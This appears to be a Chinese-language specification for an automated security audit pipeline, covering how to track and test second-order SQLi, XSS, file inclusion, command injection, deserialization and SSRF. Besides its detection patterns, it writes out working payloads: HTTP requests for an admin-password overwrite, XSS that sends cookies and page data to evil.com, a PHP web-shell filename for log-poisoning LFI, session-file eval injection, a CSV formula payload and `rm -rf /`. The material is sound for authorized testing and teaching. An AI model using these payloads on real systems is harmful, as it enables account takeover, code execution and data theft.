# 二阶漏洞追踪规范（Second-Order Vulnerability Tracking）

本文件定义二阶漏洞（存入点与使用点分离）的追踪规范。二阶漏洞是指恶意数据在一个请求中被存储，在另一个请求中被不安全地使用。

---

## 二阶漏洞类型

### 1. 二阶 SQL 注入
- **存入点**: 用户注册/资料更新 — 恶意数据写入数据库
- **使用点**: 后台管理查询/报告生成 — 从数据库取出后直接拼接 SQL
- **示例**: 注册用户名 `admin'-- ` → 管理员搜索用户时触发 SQLi

### 2. 存储型 XSS
- **存入点**: 评论/个人资料/消息 — 恶意脚本写入数据库
- **使用点**: 页面渲染 — 从数据库取出后未转义输出
- **示例**: 评论内容 `<script>...` → 其他用户查看页面时触发

### 3. 二阶文件包含
- **存入点**: 文件上传/配置修改 — 恶意路径写入数据库或配置
- **使用点**: 动态 include/require — 从数据库读取路径后包含
- **示例**: 管理员设置模板名 `../../etc/passwd` → 系统加载模板时触发 LFI

### 4. 二阶命令注入
- **存入点**: 表单输入/API 参数 — 恶意命令写入数据库
- **使用点**: 定时任务/后台脚本 — 从数据库取出后传入 system/exec
- **示例**: 文件名含 `; rm -rf /` → 定时清理脚本执行时触发

### 5. 二阶反序列化
- **存入点**: 普通 API — 序列化数据写入数据库/缓存/Session
- **使用点**: 后续请求 — 从存储中取出后 unserialize()
- **示例**: 恶意序列化字符串存入 Session → 下次请求加载 Session 时触发

### 6. 二阶 SSRF
- **存入点**: URL 配置/Webhook 设置 — 恶意 URL 写入数据库
- **使用点**: 后台任务/Webhook 触发 — 系统读取 URL 后发起请求
- **示例**: 设置 Webhook URL 为内网地址 → 事件触发时 SSRF

## 追踪矩阵

### 存入点识别

审计员在分析 **写入端点** 时，记录所有用户可控数据的存储位置:

```json
{
  "store_id": "STORE-001",
  "endpoint": "POST /api/users/register",
  "param": "username",
  "storage": "database",
  "table": "users",
  "column": "username",
  "sanitization": "none|partial|full",
  "sanitization_detail": "string (净化函数和位置)",
  "max_length": "number|null",
  "encoding": "string (UTF-8/Latin1等)"
}
```

### 使用点识别

审计员在分析 **读取端点** 时，检查从存储中取出的数据如何使用:

```json
{
  "use_id": "USE-001",
  "endpoint": "GET /admin/users/search",
  "source_table": "users",
  "source_column": "username",
  "usage_sink": "DB::raw()",
  "usage_file": "app/Http/Controllers/Admin/UserController.php",
  "usage_line": 67,
  "output_sanitization": "none|partial|full",
  "output_sanitization_detail": "string"
}
```

### 关联分析

当 **存入点** 的 `(table, column)` 与 **使用点** 的 `(source_table, source_column)` 匹配，且满足以下条件时，标记为二阶漏洞候选:

1. 存入点净化不足（`sanitization` = "none" 或 "partial"）
2. 使用点净化不足（`output_sanitization` = "none" 或 "partial"）
3. 存入与使用的净化不匹配（存入时 HTML 编码 → 使用时 SQL 拼接，编码无效）

### 关联文件

各审计员将存入点和使用点记录写入:
- `$WORK_DIR/second_order/store_points.jsonl` — 存入点记录
- `$WORK_DIR/second_order/use_points.jsonl` — 使用点记录
- `$WORK_DIR/second_order/correlations.json` — 关联分析结果（由 correlation_engine 生成）

## 各审计员职责

| 审计员 | 存入点记录 | 使用点记录 |
|--------|-----------|-----------|
| sqli-auditor | 所有 INSERT/UPDATE 中用户可控字段 | 所有从 DB 取出后拼接 SQL 的位置 |
| xss-auditor | 所有写入 DB 的用户输入 | 所有从 DB 取出后输出到 HTML 的位置 |
| rce-auditor | 所有写入 DB/文件的用户输入 | 所有从 DB/文件取出后传入命令执行的位置 |
| lfi-auditor | 所有写入 DB/配置的路径/文件名 | 所有从 DB/配置取出后用于 include 的位置 |
| ssrf-auditor | 所有写入 DB 的 URL | 所有从 DB 取出后用于 HTTP 请求的位置 |
| deserial-auditor | 所有 serialize() 后存入的数据 | 所有 unserialize() 从存储中取出的数据 |

## 测试流程

1. **Phase 4 分析阶段**: 各审计员记录存入点和使用点
2. **correlation_engine**: 自动关联分析，生成候选二阶漏洞列表
3. **Phase 4 攻击阶段**: 对候选二阶漏洞执行两步验证:
   - Step 1: 向存入点发送恶意数据
   - Step 2: 触发使用点，验证恶意数据是否被不安全使用
4. **QC-3**: 验证两步操作的因果关系

## 约束

- 二阶漏洞测试必须**同时提供存入请求和触发请求**作为证据
- 存入的恶意数据必须使用可识别的标记，便于在使用点验证
- 测试后由 env-cleaner 清理存入的恶意数据
- 记录数据在系统中的完整生命周期（存入→存储→取出→使用）

---

## 二阶 SQLi 详细攻击流程

二阶 SQL 注入的核心在于：恶意 payload 在存入时不触发任何异常（通常被正确参数化存入数据库），但在后续被取出并拼接进新的 SQL 语句时触发注入。

### 场景 1: Register malicious username → Login → View profile triggers

**攻击步骤:**

1. 攻击者注册一个包含 SQL 注入 payload 的用户名
2. 正常登录（此时 payload 仅作为字符串存储在 `users.username` 列中）
3. 当管理员或系统查看用户资料时，从数据库取出 username 并直接拼接到查询中，触发注入

**Step 1 — 注册恶意用户名 (存入点)**

```http
POST /register HTTP/1.1
Host: target.example.com
Content-Type: application/x-www-form-urlencoded
Cookie: PHPSESSID=abc123

username=admin'--+&password=Password123!&email=attacker@evil.com&submit=Register
```

Response:

```http
HTTP/1.1 302 Found
Location: /login.php
Set-Cookie: PHPSESSID=def456; path=/

<!-- 注册成功，用户名 admin'--+ 被安全地通过参数化 INSERT 存入数据库 -->
<!-- INSERT INTO users (username, password, email) VALUES (?, ?, ?) -->
<!-- 此时没有 SQLi，payload 只是被当作普通字符串存储 -->
```

**Step 2 — 正常登录**

```http
POST /login HTTP/1.1
Host: target.example.com
Content-Type: application/x-www-form-urlencoded

username=admin'--+&password=Password123!&submit=Login
```

**Step 3 — 查看个人资料触发 SQLi (使用点)**

当用户访问 profile 页面时，后端代码从 session/数据库取出 username 后直接拼接:

```php
// 漏洞代码示例
$user = $_SESSION['username']; // 从 session 取出: admin'--+
$sql = "SELECT * FROM user_profiles WHERE username = '$user'";
// 最终执行: SELECT * FROM user_profiles WHERE username = 'admin'--+'
// '--+' 注释掉后面的内容，查询变成查找 admin 用户的资料
$result = $db->query($sql);
```

```http
GET /profile.php HTTP/1.1
Host: target.example.com
Cookie: PHPSESSID=def456
```

Response:

```http
HTTP/1.1 200 OK
Content-Type: text/html; charset=UTF-8

<!-- 返回的是 admin 用户的资料，而不是 admin'--+ 的资料 -->
<!-- 说明 SQL 注入成功，攻击者可以读取任意用户数据 -->
<h1>User Profile</h1>
<p>Username: admin</p>
<p>Email: admin@target.example.com</p>
<p>Role: administrator</p>
```

### 场景 2: Register malicious username → Password change triggers → Admin password overwritten

**攻击原理:** 攻击者注册用户名为 `admin'--`，当执行修改密码操作时，后端使用 username 拼接 UPDATE 语句，导致 admin 账户的密码被覆盖。

**Step 1 — 注册恶意用户名**

```http
POST /register HTTP/1.1
Host: target.example.com
Content-Type: application/x-www-form-urlencoded

username=admin'--&password=InitPass123&email=hacker@evil.com&submit=Register
```

Response:

```http
HTTP/1.1 302 Found
Location: /login.php

<!-- 用户 admin'-- 被成功创建 -->
```

**Step 2 — 登录并修改密码 (触发点)**

```http
POST /change_password.php HTTP/1.1
Host: target.example.com
Content-Type: application/x-www-form-urlencoded
Cookie: PHPSESSID=xyz789

current_password=InitPass123&new_password=Hacked999!&confirm_password=Hacked999!
```

后端漏洞代码:

```php
// change_password.php — 漏洞代码
$username = $_SESSION['username']; // 取出: admin'--
$new_pass = password_hash($_POST['new_password'], PASSWORD_BCRYPT);

// 直接拼接 username 到 UPDATE 语句
$sql = "UPDATE users SET password = '$new_pass' WHERE username = '$username'";
// 实际执行: UPDATE users SET password = '$2y$...' WHERE username = 'admin'--'
// '--' 注释掉了后面的内容，实际上修改的是 admin 的密码！
$db->query($sql);
```

Response:

```http
HTTP/1.1 200 OK
Content-Type: text/html; charset=UTF-8

<div class="alert alert-success">Password changed successfully!</div>
<!-- 此时 admin 账户的密码已被修改为 Hacked999! -->
<!-- 攻击者可以用 admin / Hacked999! 登录管理后台 -->
```

**Step 3 — 使用被覆盖的密码登录 admin**

```http
POST /login HTTP/1.1
Host: target.example.com
Content-Type: application/x-www-form-urlencoded

username=admin&password=Hacked999!&submit=Login
```

Response:

```http
HTTP/1.1 302 Found
Location: /admin/dashboard.php
Set-Cookie: PHPSESSID=admin_session_hijacked; path=/

<!-- 成功以 admin 身份登录！二阶 SQLi 完成 -->
```

### 场景 3: Stored search conditions → Scheduled task triggers

用户自定义的搜索条件/过滤器被存入数据库，定时报告任务从数据库取出这些条件后直接拼接到 SQL 中执行。

```php
// 存入点 — 保存自定义报告筛选条件
// POST /api/reports/filters { "filter_name": "my_report", "condition": "status = 'active' OR 1=1--" }
// INSERT INTO saved_filters (user_id, name, condition) VALUES (?, ?, ?)  — 安全存入

// 使用点 — 定时任务 cron_report_generator.php
$filters = $db->query("SELECT condition FROM saved_filters WHERE active = 1");
foreach ($filters as $f) {
    // 直接拼接用户保存的 condition 到查询中
    $sql = "SELECT * FROM orders WHERE {$f['condition']}";
    // 执行: SELECT * FROM orders WHERE status = 'active' OR 1=1--
    // 返回所有订单数据，包括其他用户的私密订单
    $results = $db->query($sql);
    send_report_email($results);
}
```

---

## 二阶 XSS 模式

二阶 XSS（Stored XSS 的延伸形态）的特点是：恶意脚本在存入时的上下文中不会被执行，而是在**不同的上下文**（如管理面板、导出文件）中被触发。

### 模式 1: Stored XSS triggered via admin panel（用户资料 → 管理员查看）

**攻击链路:** 普通用户提交恶意数据 → 数据存入数据库 → 管理员在后台查看时触发 XSS

**典型场景:**

- 用户在个人资料的「昵称」「签名」「地址」字段中注入 XSS payload
- 前台页面对这些字段做了 `htmlspecialchars()` 转义，普通用户页面不触发
- 但管理后台使用了不同的模板引擎或者输出方式，未转义直接输出

```php
// 前台 — 安全输出（不触发）
echo htmlspecialchars($user['nickname']); // &lt;script&gt;...

// 后台 admin/user_detail.php — 未转义输出（触发！）
echo "<td>" . $user['nickname'] . "</td>";
// 如果 nickname = <script>document.location='http://evil.com/steal?c='+document.cookie</script>
// 管理员打开此页面时，cookie 被发送到攻击者服务器
```

**高价值目标:** 管理员的 session cookie 通常拥有更高权限，攻击者可以利用窃取的管理员 cookie 执行:
- 创建新管理员账户
- 修改系统配置
- 导出全部用户数据
- 执行服务器管理操作

### 模式 2: Stored XSS triggered via email/export（数据写入 → PDF/Excel 生成）

**攻击链路:** 用户输入恶意数据 → 数据存入数据库 → 系统导出为 PDF/Excel/CSV 时触发

**PDF 生成场景 (使用 wkhtmltopdf / Dompdf 等):**

```php
// 订单导出功能 — 从数据库取出订单备注，生成 PDF
$orders = $db->query("SELECT * FROM orders WHERE date > '2024-01-01'");

$html = "<html><body><table>";
foreach ($orders as $order) {
    // order_note 字段包含用户提交的备注，未转义
    $html .= "<tr><td>{$order['order_note']}</td></tr>";
    // 如果 order_note = <script>fetch('http://evil.com/exfil?data='+document.body.innerHTML)</script>
}
$html .= "</table></body></html>";

// wkhtmltopdf 会执行 HTML 中的 JavaScript！
$pdf = new Dompdf();
$pdf->loadHtml($html);
$pdf->render(); // XSS payload 在 PDF 渲染引擎中执行
```

**Excel/CSV 注入场景 (CSV Injection / Formula Injection):**

```php
// 用户导出功能 — 从数据库取出数据生成 CSV
$users = $db->query("SELECT username, email, phone FROM users");

$fp = fopen('php://output', 'w');
header('Content-Type: text/csv');
header('Content-Disposition: attachment; filename="users.csv"');

foreach ($users as $user) {
    // 如果 username = =cmd|'/C calc.exe'!A1
    // 当管理员用 Excel 打开此 CSV 时，会弹出计算器（或执行任意命令）
    fputcsv($fp, [$user['username'], $user['email'], $user['phone']]);
}
```

**防御要点:** 导出数据时，对每个单元格值添加前缀 `'`（单引号）或 `\t`（Tab）来阻止公式解析。

---

## 二阶文件包含模式

二阶文件包含是指恶意路径/内容在一个操作中被写入日志、session 或数据库，在另一个操作中被 `include`/`require` 加载执行。

### 模式 1: Upload filename injection → Log recording → LFI include log

**攻击链路:** 上传文件（使用恶意文件名）→ 文件名被写入日志 → LFI 漏洞 include 日志文件 → 执行恶意代码

**Step 1 — 上传带有 PHP 代码的文件名**

攻击者上传文件时，将文件名设置为包含 PHP 代码的字符串:

```http
POST /upload.php HTTP/1.1
Host: target.example.com
Content-Type: multipart/form-data; boundary=--Boundary
Cookie: PHPSESSID=abc123

----Boundary
Content-Disposition: form-data; name="file"; filename="<?php system($_GET['cmd']); ?>.jpg"
Content-Type: image/jpeg

[JFIF binary data here]
----Boundary--
```

**Step 2 — 文件名被记录到日志**

```php
// upload.php — 记录上传日志
$filename = $_FILES['file']['name']; // <?php system($_GET['cmd']); ?>.jpg
error_log("File uploaded: $filename", 3, "/var/log/app/upload.log");
// upload.log 中现在包含: File uploaded: <?php system($_GET['cmd']); ?>.jpg
```

**Step 3 — LFI 包含日志文件 (触发点)**

如果应用中存在 LFI 漏洞（例如通过 `page` 参数包含文件）:

```http
GET /index.php?page=../../../var/log/app/upload.log&cmd=id HTTP/1.1
Host: target.example.com
```

```php
// index.php — 漏洞代码
$page = $_GET['page'];
include($page); // include("/var/log/app/upload.log")
// PHP 引擎解析日志文件，遇到 <?php system($_GET['cmd']); ?> 标签
// 执行 system('id')，返回: uid=33(www-data) gid=33(www-data)
```

### 模式 2: Session data injection → Session file include

**攻击链路:** 用户通过可控输入将 PHP 代码注入到 session 数据中 → 利用 LFI 包含 session 文件 → 代码执行

**Step 1 — 将 PHP 代码注入 Session**

```http
POST /preferences.php HTTP/1.1
Host: target.example.com
Content-Type: application/x-www-form-urlencoded
Cookie: PHPSESSID=attacker_session_id_123

language=<?php+eval($_POST['c']);+?>&theme=dark
```

```php
// preferences.php — 将用户偏好存入 Session
$_SESSION['language'] = $_POST['language']; // 恶意 PHP 代码被存入 session
// Session 文件: /tmp/sess_attacker_session_id_123
// 文件内容: language|s:30:"<?php eval($_POST['c']); ?>";theme|s:4:"dark";
```

**Step 2 — LFI 包含 Session 文件**

```http
POST /index.php?page=../../../tmp/sess_attacker_session_id_123 HTTP/1.1
Host: target.example.com
Content-Type: application/x-www-form-urlencoded

c=system('cat /etc/passwd');
```

PHP 引擎解析 session 文件时，遇到 `<?php eval($_POST['c']); ?>` 标签并执行，攻击者获得 RCE。

**关键前提条件:**
- 需要知道 session 文件存储路径（常见: `/tmp/`, `/var/lib/php/sessions/`）
- 需要知道或能控制 session ID（通过 Cookie 头可知）
- 需要存在 LFI 漏洞（`include` 用户可控路径）

---

## Detection（二阶漏洞代码模式识别）

### 核心代码模式: "从数据库取出后直接拼接"

二阶漏洞的根本原因是**信任了来自数据库/存储的数据**。识别以下代码模式:

**Pattern 1 — DB data → SQL concatenation (二阶 SQLi)**

```php
// DANGEROUS: 从数据库取出的数据直接拼接到新的 SQL 语句
$row = $db->query("SELECT username FROM users WHERE id = ?", [$id])->fetch();
$sql = "SELECT * FROM logs WHERE actor = '{$row['username']}'"; // 二阶 SQLi!
```

**Pattern 2 — DB data → HTML output without escaping (二阶 XSS)**

```php
// DANGEROUS: 从数据库取出的数据未转义输出到 HTML
$user = $db->query("SELECT bio FROM profiles WHERE user_id = ?", [$id])->fetch();
echo "<div class='bio'>" . $user['bio'] . "</div>"; // 二阶 XSS!
```

**Pattern 3 — DB data → Shell command (二阶 Command Injection)**

```php
// DANGEROUS: 从数据库取出的数据传入 shell 命令
$task = $db->query("SELECT filename FROM tasks WHERE id = ?", [$id])->fetch();
system("convert " . $task['filename'] . " output.png"); // 二阶 RCE!
```

**Pattern 4 — DB/Session/Log data → include/require (二阶 LFI)**

```php
// DANGEROUS: 从数据库或其他存储取出的路径用于文件包含
$config = $db->query("SELECT template FROM settings WHERE id = 1")->fetch();
include($config['template']); // 二阶 LFI!
```

### Common trigger scenario checklist（常见触发场景清单）

在审计中重点关注以下场景，它们是二阶漏洞的高发区:

| 触发场景 | 存入点示例 | 使用点示例 | 常见漏洞类型 |
|----------|-----------|-----------|-------------|
| **密码修改** | 注册时的 username | `UPDATE ... WHERE username = '$user'` | 二阶 SQLi |
| **个人资料导出** | 用户昵称/签名/地址 | PDF/Excel/CSV 生成时未转义 | 二阶 XSS, CSV Injection |
| **管理后台查看** | 普通用户提交的任何字段 | Admin panel 中 echo 输出 | 二阶 XSS |
| **定时任务/Cron** | 用户保存的搜索条件/规则 | 定时查询拼接 SQL | 二阶 SQLi |
| **日志查看器** | 任何被写入日志的用户输入 | 日志页面直接输出/LFI include | 二阶 XSS, 二阶 LFI |
| **邮件发送** | 用户名/订单备注 | 邮件模板拼接 HTML | 二阶 XSS |
| **Webhook/回调** | 用户设置的 URL/参数 | 系统发起 HTTP 请求 | 二阶 SSRF |
| **API 响应** | 存储的配置/模板字符串 | JSON/XML 拼接输出 | 二阶注入 |

### 如何区分一阶与二阶漏洞 (How to distinguish from first-order vulnerabilities)

| 特征 | 一阶漏洞 (First-Order) | 二阶漏洞 (Second-Order) |
|------|----------------------|------------------------|
| **数据流** | Input → 直接使用 | Input → 存储 → 取出 → 使用 |
| **请求数量** | 单个请求即可触发 | 需要至少两个请求（存入 + 触发） |
| **时间间隔** | 即时触发 | 可能间隔数小时/天（如定时任务） |
| **触发者** | 攻击者自己触发 | 可能由其他用户/管理员/系统触发 |
| **Scanner 检测** | 自动扫描器容易检测 | 自动扫描器几乎无法检测 |
| **数据来源** | `$_GET`, `$_POST`, `$_COOKIE` 等 | `$db->query()`, `$_SESSION`, `file_get_contents()` 等 |
| **修复关键** | 在输入点做 sanitize/parameterize | 在**每个使用点**都做 sanitize/parameterize（不能信任数据库中的数据） |

**核心原则:** 永远不要信任从任何存储（数据库、Session、文件、缓存）中取出的数据。即使数据在存入时已经过验证，在使用时仍需根据当前上下文进行适当的转义/参数化处理。
